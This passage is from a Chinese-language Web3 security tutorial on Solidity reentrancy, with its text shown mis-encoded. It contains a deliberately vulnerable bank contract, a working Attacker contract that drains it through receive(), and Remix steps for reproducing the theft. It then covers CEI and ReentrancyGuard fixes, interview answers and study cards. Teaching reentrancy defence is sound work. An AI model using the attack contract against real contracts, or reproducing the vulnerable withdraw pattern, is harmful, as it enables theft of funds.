        // å±é™©ï¼šåæ›´æ–°çŠ¶æ€
        balances[msg.sender] = 0;
    }
    
    // æŸ¥çœ‹åˆçº¦ä½™é¢
    function getContractBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

### åœºæ™¯2ï¼šæ”»å‡»åˆçº¦æ¼”ç¤º

```solidity
// ===== 2. æ”»å‡»åˆçº¦ =====
contract Attacker {
    VulnerableBank public bank;
    address public owner;
    uint256 public attackCount;
    
    constructor(address _bank) {
        bank = VulnerableBank(_bank);
        owner = msg.sender;
    }
    
    // å‘èµ·æ”»å‡»
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        
        // 1. å…ˆå­˜æ¬¾
        bank.deposit{value: msg.value}();
        
        // 2. è§¦å‘ææ¬¾ï¼ˆè¿™ä¼šè§¦å‘ receiveï¼‰
        bank.withdraw();
    }
    
    // æ¥æ”¶ETHæ—¶è‡ªåŠ¨è§¦å‘
    receive() external payable {
        attackCount++;
        
        // å¦‚æœé“¶è¡Œè¿˜æœ‰é’±ï¼Œç»§ç»­æ”»å‡»
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();  // é‡å…¥ï¼
        }
    }
    
    // æå–ç›—å–çš„èµ„é‡‘
    function collectStolenFunds() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
    
    // æŸ¥çœ‹æ”»å‡»æ¬¡æ•°
    function getAttackCount() external view returns (uint256) {
        return attackCount;
    }
}
```

### åœºæ™¯3ï¼šä¿®å¤æ–¹æ¡ˆ

```solidity
// ===== 3. ä¿®å¤æ–¹æ¡ˆ1ï¼šCEIæ¨¡å¼ =====
contract SecureBankCEI {
    mapping(address => uint256) public balances;
    
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
    
    // âœ… ä½¿ç”¨CEIæ¨¡å¼
    function withdraw() external {
        // Checksï¼ˆæ£€æŸ¥ï¼‰
        uint256 balance = balances[msg.sender];
        require(balance > 0, "No balance");
        
        // Effectsï¼ˆçŠ¶æ€æ›´æ–°ï¼‰- å…ˆæ›´æ–°ï¼
        balances[msg.sender] = 0;
        
        // Interactionsï¼ˆäº¤äº’ï¼‰- åè½¬è´¦
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");
    }
}

// ===== 4. ä¿®å¤æ–¹æ¡ˆ2ï¼šReentrancyGuard =====
abstract contract ReentrancyGuard {
    uint256 private constant NOT_ENTERED = 1;
    uint256 private constant ENTERED = 2;
    uint256 private _status;
    
    constructor() {
        _status = NOT_ENTERED;
    }
    
    modifier nonReentrant() {
        require(_status != ENTERED, "ReentrancyGuard: reentrant call");
        _status = ENTERED;
        _;
        _status = NOT_ENTERED;
    }
}

contract SecureBankGuard is ReentrancyGuard {
    mapping(address => uint256) public balances;
    
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
    
    // âœ… ä½¿ç”¨nonReentrantä¿®é¥°ç¬¦
    function withdraw() external nonReentrant {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "No balance");
        
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");
        
        balances[msg.sender] = 0;
    }
}
```

### æ”»å‡»æ¼”ç¤ºæ­¥éª¤ï¼ˆåœ¨Remixä¸­æµ‹è¯•ï¼‰

```
1. éƒ¨ç½² VulnerableBank
2. ç”¨è´¦æˆ·Aå­˜å…¥ 10 ETHï¼ˆè°ƒç”¨ depositï¼Œvalue = 10 etherï¼‰
3. éƒ¨ç½² Attackerï¼Œä¼ å…¥ VulnerableBank åœ°å€
4. ç”¨è´¦æˆ·Bè°ƒç”¨ Attacker.attack()ï¼Œvalue = 1 ether
5. æŸ¥çœ‹ç»“æœï¼š
   - VulnerableBank ä½™é¢ä» 10 ETH å˜æˆ 0
   - Attacker ä½™é¢å˜æˆ 11 ETH
   - attackCount æ˜¾ç¤ºé‡å…¥æ¬¡æ•°
```

**é¢„æœŸè¾“å‡ºï¼š**

```
æ”»å‡»å‰ï¼š
  VulnerableBank.balance = 10 ETH
  Attacker.balance = 0 ETH

æ”»å‡»åï¼š
  VulnerableBank.balance = 0 ETH
  Attacker.balance = 11 ETH
  attackCount = 10 (é‡å…¥äº†10æ¬¡)
```

---

## 8. ã€é¢è¯•å¿…é—®ã€‘

### é—®é¢˜1ï¼š"ä»€ä¹ˆæ˜¯é‡å…¥æ”»å‡»ï¼Ÿå¦‚ä½•é˜²æ­¢ï¼Ÿ"

**æ™®é€šå›ç­”ï¼ˆâŒ ä¸å‡ºå½©ï¼‰ï¼š**

"é‡å…¥æ”»å‡»æ˜¯æ”»å‡»è€…åå¤è°ƒç”¨ææ¬¾å‡½æ•°ç›—å–èµ„é‡‘ã€‚é˜²æ­¢æ–¹æ³•æ˜¯ä½¿ç”¨ ReentrancyGuardã€‚"

**å‡ºå½©å›ç­”ï¼ˆâœ… æ¨èï¼‰ï¼š**

> **é‡å…¥æ”»å‡»å¯ä»¥ä»ä¸‰ä¸ªå±‚é¢ç†è§£ï¼š**
>
> **1. æ‰§è¡ŒåŸç†**ï¼š
> å½“åˆçº¦Aå‘åˆçº¦Bè½¬è´¦æ—¶ï¼ˆé€šè¿‡call/transfer/sendï¼‰ï¼Œæ§åˆ¶æƒä¸´æ—¶è½¬ç§»ç»™Bã€‚å¦‚æœBæ˜¯æ¶æ„åˆçº¦ï¼Œå®ƒå¯ä»¥åœ¨å…¶ `receive()` æˆ– `fallback()` ä¸­å›è°ƒAçš„å‡½æ•°ã€‚å¦‚æœAçš„çŠ¶æ€è¿˜æ²¡æ›´æ–°ï¼ŒBå°±èƒ½åˆ©ç”¨æ—§çŠ¶æ€é‡å¤æ“ä½œã€‚
>
> **2. æ”»å‡»æ¡ä»¶**ï¼š
> - åˆçº¦åœ¨å¤–éƒ¨è°ƒç”¨åæ‰æ›´æ–°çŠ¶æ€
> - å¤–éƒ¨è°ƒç”¨çš„æ¥æ”¶æ–¹æ˜¯åˆçº¦è€ŒéEOA
> - è¢«è°ƒç”¨çš„å‡½æ•°æ²¡æœ‰é‡å…¥ä¿æŠ¤
>
> **3. é˜²å¾¡æ–¹æ¡ˆ**ï¼ˆæŒ‰ä¼˜å…ˆçº§ï¼‰ï¼š
> - **CEIæ¨¡å¼**ï¼šChecks-Effects-Interactionsï¼Œå…ˆæ£€æŸ¥æ¡ä»¶ã€æ›´æ–°çŠ¶æ€ï¼Œæœ€åæ‰å¤–éƒ¨è°ƒç”¨
> - **ReentrancyGuard**ï¼šä½¿ç”¨äº’æ–¥é”é˜»æ­¢åŒä¸€å‡½æ•°è¢«é‡å¤è¿›å…¥
> - **Pull Payment**ï¼šä¸ä¸»åŠ¨æ¨é€èµ„é‡‘ï¼Œè®©ç”¨æˆ·è‡ªå·±æ¥å–
>
> **å†å²æ¡ˆä¾‹**ï¼š
> 2016å¹´The DAOæ”»å‡»æŸå¤±çº¦6000ä¸‡ç¾å…ƒETHï¼Œç›´æ¥å¯¼è‡´ä»¥å¤ªåŠåˆ†å‰ä¸ºETHå’ŒETCã€‚è¿™æ˜¯åŒºå—é“¾å†å²ä¸Šæœ€é‡è¦çš„å®‰å…¨äº‹ä»¶ä¹‹ä¸€ã€‚
>
> **åœ¨å®é™…å·¥ä½œä¸­**ï¼š
> æˆ‘ä»¬ä½¿ç”¨ OpenZeppelin çš„ ReentrancyGuardï¼ŒåŒæ—¶å¼ºåˆ¶è¦æ±‚ä»£ç éµå¾ª CEI æ¨¡å¼ã€‚åœ¨ä»£ç å®¡è®¡æ—¶ï¼Œæˆ‘ä¼šç‰¹åˆ«å…³æ³¨æ‰€æœ‰åŒ…å«å¤–éƒ¨è°ƒç”¨çš„å‡½æ•°ã€‚

**ä¸ºä»€ä¹ˆè¿™ä¸ªå›ç­”å‡ºå½©ï¼Ÿ**
1. âœ… åˆ†å±‚æ¬¡è§£é‡Šï¼ˆåŸç†ã€æ¡ä»¶ã€æ–¹æ¡ˆï¼‰
2. âœ… æåˆ°äº†å†å²æ¡ˆä¾‹ï¼ˆThe DAOï¼‰
3. âœ… ç»™å‡ºäº†å¤šç§é˜²å¾¡æ–¹æ¡ˆå¹¶æ’åº
4. âœ… è”ç³»åˆ°å®é™…å·¥ä½œæµç¨‹

---

### é—®é¢˜2ï¼š"CEIæ¨¡å¼å’ŒReentrancyGuardåº”è¯¥ç”¨å“ªä¸ªï¼Ÿ"

**æ™®é€šå›ç­”ï¼ˆâŒ ä¸å‡ºå½©ï¼‰ï¼š**

"ä¸¤ä¸ªéƒ½ç”¨æœ€å®‰å…¨ã€‚"

**å‡ºå½©å›ç­”ï¼ˆâœ… æ¨èï¼‰ï¼š**

> **è¿™ä¸¤ç§æ–¹æ¡ˆå„æœ‰ç‰¹ç‚¹ï¼Œæœ€ä½³å®è·µæ˜¯ç»„åˆä½¿ç”¨ï¼š**
>
> **CEIæ¨¡å¼**ï¼š
> - ä¼˜ç‚¹ï¼šé›¶é¢å¤– gas æˆæœ¬ï¼Œä»£ç æ›´æ¸…æ™°
> - ç¼ºç‚¹ï¼šéœ€è¦å¼€å‘è€…æœ‰æ„è¯†åœ°éµå¾ªï¼Œå®¹æ˜“é—æ¼
> - é€‚ç”¨ï¼šæ‰€æœ‰æ¶‰åŠå¤–éƒ¨è°ƒç”¨çš„å‡½æ•°
>
> **ReentrancyGuard**ï¼š
> - ä¼˜ç‚¹ï¼šå¼ºåˆ¶ä¿æŠ¤ï¼Œä¸ä¾èµ–ä»£ç é¡ºåº
> - ç¼ºç‚¹ï¼šæ¯æ¬¡è°ƒç”¨é¢å¤–æ¶ˆè€—çº¦ 2400 gasï¼ˆè¯»å†™çŠ¶æ€å˜é‡ï¼‰
> - é€‚ç”¨ï¼šé«˜é£é™©å‡½æ•°ï¼Œè·¨å‡½æ•°è°ƒç”¨åœºæ™¯
>
> **æˆ‘çš„å»ºè®®**ï¼š
> 1. **å§‹ç»ˆéµå¾ªCEIæ¨¡å¼**ï¼šè¿™æ˜¯ç¼–ç è§„èŒƒï¼Œé›¶æˆæœ¬
> 2. **å…³é”®å‡½æ•°åŠ ReentrancyGuard**ï¼šä½œä¸ºé¢å¤–ä¿é™©
> 3. **å¤æ‚åè®®ç”¨å…¨å±€é”**ï¼šé˜²æ­¢è·¨å‡½æ•°é‡å…¥
>
> ```solidity
> // æœ€ä½³å®è·µï¼šä¸¤è€…ç»“åˆ
> function withdraw() external nonReentrant {
>     uint256 amount = balances[msg.sender];
>     require(amount > 0);
>     
>     balances[msg.sender] = 0;  // CEI: Effects
>     
>     (bool success, ) = msg.sender.call{value: amount}("");
>     require(success);  // CEI: Interactions
> }
> ```
>
> **ç‰¹æ®Šæƒ…å†µ**ï¼š
> 2023å¹´ Curve æ”»å‡»æš´éœ²äº†"åªè¯»é‡å…¥"é£é™©ï¼Œå³ä½¿ä¸ä¿®æ”¹çŠ¶æ€ï¼Œåœ¨å›è°ƒä¸­è¯»å–ä¸ä¸€è‡´çŠ¶æ€ä¹Ÿå¯èƒ½è¢«åˆ©ç”¨ã€‚è¿™ç§æƒ…å†µéœ€è¦æ›´å¤æ‚çš„ä¿æŠ¤æœºåˆ¶ã€‚

**ä¸ºä»€ä¹ˆè¿™ä¸ªå›ç­”å‡ºå½©ï¼Ÿ**
1. âœ… å¯¹æ¯”åˆ†æä¸¤ç§æ–¹æ¡ˆçš„ä¼˜ç¼ºç‚¹
2. âœ… ç»™å‡ºå…·ä½“çš„gasæˆæœ¬æ•°æ®
3. âœ… æä¾›äº†ä»£ç ç¤ºä¾‹
4. âœ… æåˆ°äº†æœ€æ–°çš„å®‰å…¨äº‹ä»¶ï¼ˆCurveï¼‰

---

## 9. ã€åŒ–éª¨ç»µæŒã€‘

### å¡ç‰‡1ï¼šä»€ä¹ˆæ˜¯é‡å…¥æ”»å‡»ï¼Ÿ ğŸ¯

**ä¸€å¥è¯ï¼š** æ”»å‡»è€…åœ¨åˆçº¦æ›´æ–°çŠ¶æ€å‰ï¼Œé€šè¿‡å›è°ƒå‡½æ•°é‡å¤è°ƒç”¨åŒä¸€å‡½æ•°ï¼Œçªƒå–èµ„é‡‘ã€‚

**ä¸¾ä¾‹ï¼š**
```
ä½ çš„åˆçº¦ï¼šwithdraw() â†’ è½¬è´¦ â†’ æ›´æ–°ä½™é¢
æ”»å‡»è€…ï¼šæ”¶åˆ°è½¬è´¦ â†’ è§¦å‘receive() â†’ å†æ¬¡è°ƒç”¨withdraw() â†’ åˆæ”¶åˆ°è½¬è´¦...
```

**åº”ç”¨ï¼š** The DAO æ”»å‡»ï¼ˆ2016å¹´ï¼‰åˆ©ç”¨æ­¤æ¼æ´æŸå¤±äº†6000ä¸‡ç¾å…ƒï¼Œå¯¼è‡´ä»¥å¤ªåŠåˆ†å‰ã€‚

---

### å¡ç‰‡2ï¼šå¤–éƒ¨è°ƒç”¨çš„ä¸‰ç§æ–¹å¼ ğŸ“

**ä¸€å¥è¯ï¼š** Solidity ä¸­å‘å…¶ä»–åœ°å€å‘é€ ETH æœ‰ä¸‰ç§æ–¹å¼ï¼šcallã€transferã€sendã€‚

**ä¸¾ä¾‹ï¼š**
```solidity
// æ¨èï¼šcallï¼ˆæœ€çµæ´»ï¼Œéœ€æ‰‹åŠ¨æ£€æŸ¥è¿”å›å€¼ï¼‰
(bool success, ) = to.call{value: amount}("");

// ä¸æ¨èï¼štransferï¼ˆ2300 gasé™åˆ¶ï¼Œå¯èƒ½å¤±è´¥ï¼‰
to.transfer(amount);

// ä¸æ¨èï¼šsendï¼ˆ2300 gasé™åˆ¶ï¼Œè¿”å›boolï¼‰
bool success = to.send(amount);
```

**åº”ç”¨ï¼š** ç°ä»£åˆçº¦ç»Ÿä¸€ä½¿ç”¨ `call`ï¼Œé…åˆ CEI æ¨¡å¼æˆ– ReentrancyGuardã€‚

---

### å¡ç‰‡3ï¼šreceive() å’Œ fallback() ğŸª

**ä¸€å¥è¯ï¼š** å½“åˆçº¦æ”¶åˆ° ETH æ—¶ï¼Œä¼šè‡ªåŠ¨è§¦å‘ receive()ï¼ˆçº¯è½¬è´¦ï¼‰æˆ– fallback()ï¼ˆå¸¦æ•°æ®ï¼‰ã€‚

**ä¸¾ä¾‹ï¼š**
```solidity
contract Receiver {
    // æ”¶åˆ°çº¯ETHæ—¶è§¦å‘
    receive() external payable {
        // æ”»å‡»è€…å¯ä»¥åœ¨è¿™é‡Œå†™æ¶æ„ä»£ç 
    }
    
    // æ”¶åˆ°ETH+æ•°æ®ï¼Œæˆ–è°ƒç”¨ä¸å­˜åœ¨çš„å‡½æ•°æ—¶è§¦å‘
    fallback() external payable { }
}
```

**åº”ç”¨ï¼š** æ”»å‡»è€…åœ¨ receive() ä¸­æ·»åŠ é‡å…¥ä»£ç ï¼Œåœ¨æ”¶åˆ°è½¬è´¦æ—¶è‡ªåŠ¨æ‰§è¡Œã€‚

---

### å¡ç‰‡4ï¼šCEIæ¨¡å¼ ğŸ“‹

**ä¸€å¥è¯ï¼š** Checks-Effects-Interactionsï¼Œå…ˆæ£€æŸ¥æ¡ä»¶ã€æ›´æ–°çŠ¶æ€ã€æœ€åå¤–éƒ¨è°ƒç”¨ã€‚

**ä¸¾ä¾‹ï¼š**
```solidity
function withdraw() external {
    // 1. Checks
    require(balances[msg.sender] > 0);
    
    // 2. Effects (å…ˆæ›´æ–°çŠ¶æ€ï¼)
    uint256 amount = balances[msg.sender];
    balances[msg.sender] = 0;
    
    // 3. Interactions (åå¤–éƒ¨è°ƒç”¨)
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success);
}
```

**åº”ç”¨ï¼š** è¿™æ˜¯æ™ºèƒ½åˆçº¦å¼€å‘çš„åŸºæœ¬è§„èŒƒï¼Œæ‰€æœ‰æ¶‰åŠå¤–éƒ¨è°ƒç”¨çš„å‡½æ•°éƒ½åº”éµå¾ªã€‚

---

### å¡ç‰‡5ï¼šReentrancyGuard å®ç° ğŸ”’

**ä¸€å¥è¯ï¼š** ä½¿ç”¨çŠ¶æ€å˜é‡ä½œä¸ºé”ï¼Œé˜»æ­¢å‡½æ•°åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­è¢«å†æ¬¡è°ƒç”¨ã€‚

**ä¸¾ä¾‹ï¼š**
```solidity
uint256 private _status = 1; // NOT_ENTERED

modifier nonReentrant() {
    require(_status != 2, "Reentrant call");
    _status = 2; // ENTERED
    _;
    _status = 1; // NOT_ENTERED
}
```

**åº”ç”¨ï¼š** OpenZeppelin æä¾›å¼€ç®±å³ç”¨çš„ ReentrancyGuardï¼Œç›´æ¥ç»§æ‰¿ä½¿ç”¨ã€‚

---

### å¡ç‰‡6ï¼šè·¨å‡½æ•°é‡å…¥ âš ï¸

**ä¸€å¥è¯ï¼š** æ”»å‡»è€…å¯ä»¥åœ¨å›è°ƒä¸­è°ƒç”¨åˆçº¦çš„å…¶ä»–å‡½æ•°ï¼Œä¸ä»…ä»…æ˜¯å½“å‰å‡½æ•°ã€‚

**ä¸¾ä¾‹ï¼š**
```solidity
// withdraw() ä¸­è°ƒç”¨å¤–éƒ¨åˆçº¦
// æ”»å‡»è€…å¯ä»¥åœ¨å›è°ƒä¸­è°ƒç”¨ transfer()
function transfer(address to, uint256 amount) external {
    require(balances[msg.sender] >= amount); // æ£€æŸ¥æ—§ä½™é¢
    balances[msg.sender] -= amount;
    balances[to] += amount;
}
```

**åº”ç”¨ï¼š** å…³é”®å‡½æ•°éƒ½è¦åŠ  nonReentrantï¼Œæˆ–ä½¿ç”¨å…¨å±€é”ã€‚

---

### å¡ç‰‡7ï¼šåªè¯»é‡å…¥ ğŸ‘€

**ä¸€å¥è¯ï¼š** å³ä½¿ä¸ä¿®æ”¹çŠ¶æ€ï¼Œåœ¨å›è°ƒä¸­è¯»å–ä¸ä¸€è‡´çš„çŠ¶æ€ä¹Ÿå¯èƒ½è¢«åˆ©ç”¨å¥—åˆ©ã€‚

**ä¸¾ä¾‹ï¼š**
```
1. æ± å­å¼€å§‹swapï¼Œæ›´æ–°äº†reserve
2. æ”»å‡»è€…æ”¶åˆ°å›è°ƒ
3. æ”»å‡»è€…è°ƒç”¨getPrice()ï¼Œæ­¤æ—¶reserveå·²æ›´æ–°ä½†priceæœªæ›´æ–°
4. åˆ©ç”¨ä»·æ ¼å·®å¥—åˆ©
```

**åº”ç”¨ï¼š** 2023å¹´ Curve æ”»å‡»å°±æ˜¯åˆ©ç”¨åªè¯»é‡å…¥ï¼ŒæŸå¤±è¶…è¿‡7000ä¸‡ç¾å…ƒã€‚

---

### å¡ç‰‡8ï¼šgas é™åˆ¶çš„é™·é˜± â›½

**ä¸€å¥è¯ï¼š** ä¸è¦ä¾èµ– 2300 gas é™åˆ¶æ¥é˜²æ­¢é‡å…¥ï¼Œå› ä¸º gas æˆæœ¬ä¼šéšç¡¬åˆ†å‰å˜åŒ–ã€‚

**ä¸¾ä¾‹ï¼š**
```solidity
// âŒ ä¸è¦è¿™æ ·åš
payable(msg.sender).transfer(amount); // 2300 gas "é™åˆ¶"

// âœ… ä½¿ç”¨ CEI + call
balances[msg.sender] = 0;
(bool success, ) = msg.sender.call{value: amount}("");
```

**åº”ç”¨ï¼š** EIP-1884 æé«˜äº†æŸäº›æ“ä½œçš„ gas æˆæœ¬ï¼Œå¯¼è‡´åŸæœ¬å®‰å…¨çš„ä»£ç å¯èƒ½å¤±æ•ˆã€‚

---

### å¡ç‰‡9ï¼šæ”»å‡»æ£€æµ‹æ¸…å• ğŸ”

**ä¸€å¥è¯ï¼š** ä»£ç å®¡è®¡æ—¶ï¼Œæ£€æŸ¥æ‰€æœ‰å¤–éƒ¨è°ƒç”¨åæ˜¯å¦æœ‰çŠ¶æ€æ›´æ–°ã€‚

**ä¸¾ä¾‹ï¼š**
```
â–¡ æ˜¯å¦åœ¨ call/transfer/send åä¿®æ”¹çŠ¶æ€å˜é‡ï¼Ÿ
â–¡ æ˜¯å¦è°ƒç”¨äº†å¤–éƒ¨åˆçº¦çš„å‡½æ•°ï¼Ÿ
â–¡ è¢«è°ƒç”¨å‡½æ•°æ˜¯å¦æœ‰ nonReentrantï¼Ÿ
â–¡ æ˜¯å¦å­˜åœ¨è·¨å‡½æ•°è°ƒç”¨é£é™©ï¼Ÿ
â–¡ æ˜¯å¦æœ‰åªè¯»é‡å…¥é£é™©ï¼Ÿ
```

**åº”ç”¨ï¼š** åœ¨éƒ¨ç½²å‰ä½¿ç”¨ Slither ç­‰å·¥å…·è‡ªåŠ¨æ‰«æé‡å…¥æ¼æ´ã€‚

---

### å¡ç‰‡10ï¼šå†å²æ•™è®­ä¸æœ€ä½³å®è·µ ğŸ“š

**ä¸€å¥è¯ï¼š** ä» The DAO åˆ° Curveï¼Œé‡å…¥æ”»å‡»æ¼”å˜æ›´å¤æ‚ï¼Œé˜²å¾¡ä¹Ÿéœ€è¦ä¸æ–­å‡çº§ã€‚

**æ ¸å¿ƒå®è·µï¼š**
```
1. å§‹ç»ˆéµå¾ª CEI æ¨¡å¼
2. é«˜é£é™©å‡½æ•°ä½¿ç”¨ ReentrancyGuard
3. ä½¿ç”¨ OpenZeppelin å®‰å…¨åº“
4. ä¸Šçº¿å‰è¿›è¡Œå®‰å…¨å®¡è®¡
5. æŒç»­å…³æ³¨æ–°å‹æ”»å‡»æ‰‹æ³•
```

**å»¶ä¼¸å­¦ä¹ ï¼š**
- SWC-107: Reentrancy
- Consensys æ™ºèƒ½åˆçº¦æœ€ä½³å®è·µ
- OpenZeppelin å®‰å…¨æŒ‡å—

---

## 10. ã€ä¸€å¥è¯æ€»ç»“ã€‘

**é‡å…¥æ”»å‡»æ˜¯æ™ºèƒ½åˆçº¦æœ€ç»å…¸çš„å®‰å…¨æ¼æ´ï¼Œæ”»å‡»è€…åˆ©ç”¨å¤–éƒ¨è°ƒç”¨æ—¶çŠ¶æ€æœªæ›´æ–°çš„æ—¶é—´çª—å£é€’å½’è°ƒç”¨å‡½æ•°ç›—å–èµ„é‡‘ï¼Œé˜²å¾¡æ ¸å¿ƒæ˜¯éµå¾ªCEIæ¨¡å¼ï¼ˆå…ˆæ›´æ–°çŠ¶æ€åäº¤äº’ï¼‰å¹¶ä½¿ç”¨ReentrancyGuardäº’æ–¥é”ã€‚**

---

## ğŸ“š é™„å½•

### å­¦ä¹ æ£€æŸ¥æ¸…å•

å®Œæˆæœ¬çŸ¥è¯†ç‚¹å­¦ä¹ åï¼Œä½ åº”è¯¥èƒ½å¤Ÿï¼š

- [ ] è§£é‡Šé‡å…¥æ”»å‡»çš„åŸç†å’Œæ¡ä»¶
- [ ] è¯†åˆ«ä»£ç ä¸­çš„é‡å…¥æ¼æ´
- [ ] ä½¿ç”¨ CEI æ¨¡å¼é‡æ„ä¸å®‰å…¨ä»£ç 
- [ ] æ­£ç¡®ä½¿ç”¨ ReentrancyGuard
- [ ] ç†è§£ call/transfer/send çš„åŒºåˆ«
- [ ] äº†è§£ The DAO å’Œ Curve æ”»å‡»äº‹ä»¶
- [ ] åŒºåˆ†å•å‡½æ•°é‡å…¥å’Œè·¨å‡½æ•°é‡å…¥
- [ ] ç†è§£åªè¯»é‡å…¥çš„é£é™©
- [ ] åœ¨ Remix ä¸­å¤ç°é‡å…¥æ”»å‡»

### å¿«é€Ÿå‚è€ƒå¡

**å±é™©æ¨¡å¼ï¼š**
```solidity
// âŒ å±é™©
msg.sender.call{value: amount}("");
balances[msg.sender] = 0;  // çŠ¶æ€æ›´æ–°å¤ªæ™š
```

**å®‰å…¨æ¨¡å¼ï¼š**
```solidity
// âœ… å®‰å…¨ (CEI)
balances[msg.sender] = 0;  // å…ˆæ›´æ–°çŠ¶æ€
msg.sender.call{value: amount}("");

// âœ… å®‰å…¨ (Guard)
function withdraw() external nonReentrant { ... }
```

**OpenZeppelin ä½¿ç”¨ï¼š**
```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract MyContract is ReentrancyGuard {
    function sensitiveFunction() external nonReentrant {
        // å—ä¿æŠ¤çš„ä»£ç 
    }
}
```

### å‚è€ƒèµ„æº

- [SWC-107: Reentrancy](https://swcregistry.io/docs/SWC-107)
- [Consensys Smart Contract Best Practices](https://consensys.github.io/smart-contract-best-practices/)
- [OpenZeppelin ReentrancyGuard](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard)
- [The DAO Hack Explained](https://www.gemini.com/cryptopedia/the-dao-hack-makerdao)

---

**ç‰ˆæœ¬ï¼š** v1.0
**åˆ›å»ºæ—¥æœŸï¼š** 2025-12-08
**é€‚ç”¨äººç¾¤ï¼š** å‰ç«¯å·¥ç¨‹å¸ˆè½¬Web3å¼€å‘

---

**è®°ä½ï¼š** æ°¸è¿œå…ˆæ›´æ–°çŠ¶æ€ï¼Œåå¤–éƒ¨è°ƒç”¨ï¼è¿™æ˜¯æ™ºèƒ½åˆçº¦å®‰å…¨çš„é‡‘ç§‘ç‰å¾‹ã€‚ğŸ”’
